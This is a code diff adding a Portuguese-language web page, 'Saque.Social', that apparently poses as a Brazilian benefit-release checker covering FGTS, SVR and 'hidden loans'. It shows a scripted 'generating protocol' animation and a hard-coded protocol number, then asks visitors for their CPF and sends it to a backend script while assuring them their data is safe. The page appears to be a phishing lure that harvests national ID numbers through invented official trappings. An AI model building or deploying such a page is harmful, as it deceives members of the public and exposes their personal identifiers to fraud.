@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="css/global.css">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet">
+
+        
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <title>Saque.Social - Consulta!</title>
+</head>
+<body>
+    <div class="menu">
+        <img src="img/saque-social-4.webp" alt="logo">
+    </div>
+    <div class="esconder">
+        <div class="titulo">
+            <h1>Veja se seu Benefício foi liberado.</h1>
+            <p><span>Cidadãos Empregados e Desempregados: </span>Verifique sua elegibilidade para recursos disponíveis.</p>
+        </div>
+    
+        <div id="progress-bar">
+            <div id="progress"></div>
+        </div>
+    
+        <div class="consulta">
+            <div class="elementosConsulta">
+                <button id="timer-button">
+                    <span id="loading" style="display:inline; vertical-align: middle;">
+                    <img alt="Loading..." src="img/loading.gif" style="vertical-align: middle;" width="20"/>
+                    </span>
+                    <span id="buttonText" style="vertical-align: middle;">Gerando Protocolo...</span>
+                </button>
+        
+                <div class="buttonConsultar">
+                    <button id="consular">CONSULTAR</button>
+                </div>
+                <div class="font">
+                    <p>Fontes: <span>FGTS</span>, SVR, Emprestimos ocultos, <span>Resgates Estaduais</span> e <span>+</span></p>
+                </div>
+    
+                <div class="svg-container">
+                    <svg fill="none" viewbox="0 0 324 43" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M1 13.0237C1 13.0237 41.5 -8.47626 49.5 6.02374C57.5 20.5237 74 8.52374 95 18.0237C116 27.5237 122 13.0237 150 6.02374C178 -0.976262 182.5 19.0237 196.5 27.5237C210.5 36.0238 231.5 6.02374 248.5 6.02374C265.5 6.02374 278.5 39.5238 323 27.5237" stroke="#0EB7FF"></path>
+                        <path d="M1 15.0237C1 15.0237 41.5 -6.47626 49.5 8.02374C57.5 22.5237 74 10.5237 95 20.0237C116 29.5237 122 15.0237 150 8.02374C178 1.02374 182.5 21.0237 196.5 29.5237C210.5 38.0238 231.5 8.02374 248.5 8.02374C265.5 8.02374 278.5 41.5238 323 29.5237" stroke="#0EB7FF" stroke-opacity="0.14"></path>
+                        <path d="M1 21.9691C1 21.9691 33.5 7.94538 49.5 14.9691C65.5 21.9929 81 7.94541 95 26.9691C109 45.9928 135.639 9.14092 150 14.9691C164.361 20.7973 185.547 18.4359 196.5 36.4691C207.453 54.5023 232.5 2.94543 248.5 14.9691C264.5 26.9928 285.5 10.4454 323 36.4691" stroke="#F96B4C"></path>
+                        <path d="M1 23.9691C1 23.9691 33.5 9.94538 49.5 16.9691C65.5 23.9929 81 9.94541 95 28.9691C109 47.9928 135.639 11.1409 150 16.9691C164.361 22.7973 185.547 20.4359 196.5 38.4691C207.453 56.5023 232.5 4.94543 248.5 16.9691C264.5 28.9928 285.5 12.4454 323 38.4691" stroke="#F96B4C" stroke-opacity="0.22"></path>
+                    </svg>
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    <div class="aparecer">
+        <div class="buttonmodal">
+            <button class="myModal-button">Protocolo de atendimento: <strong>643</strong></button>
+        </div>
+
+        <form action="php/api.php">
+            <div class="myModal-input" style="position: relative;">
+                <input id="cpf" name="cpf" placeholder="Digite seu CPF" required="" type="tel" maxlength="14" oninput="formatAndValidateCPF(this);" />
+                <span id="cpf-error" style="display:none; color:red; position: absolute; bottom: -20px; left: 0;">CPF inválido</span>
+                <span id="cpf-icon" style="display:none; position: absolute; right: 10px; top: 50%; transform: translateY(-50%);">❌</span>
+            </div>
+            <div class="myModal-checkbox">
+                <input id="checkbox" type="checkbox"/>
+                <label for="checkbox">Buscar 6 vias de resgate</label>
+            </div>
+            <input type="submit" class="myModal-consultar-button" id="consultar-button" value="Consultar"> 
+            <div class="subtitle">
+                <p class="myModal-footer-text">Garantimos a total segurança dos <span style="color: #FF8C00; font-weight: bold;">seus dados</span>.</p>
+            </div>
+        </form>
+
+    </div>
+
+
+    
+    <script src="js/validacao.js"></script>
+    <script src="js/animacao.js"></script>
+</body>
+</html>
